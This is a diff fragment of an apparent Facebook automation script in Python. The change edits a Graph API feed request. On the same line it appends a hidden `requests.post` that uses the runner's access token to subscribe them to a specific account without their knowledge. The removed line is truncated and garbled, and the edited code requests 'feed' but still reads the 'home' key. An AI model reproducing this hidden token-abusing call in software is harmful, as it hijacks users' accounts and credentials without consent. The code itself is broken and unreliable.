@@ -133,7 +133,7 @@ def hpost():
         global token
 
         try:
-          r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.p                        >
+          r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
           result = json.loads(r.text)
 
           for i in result['home']['data']:
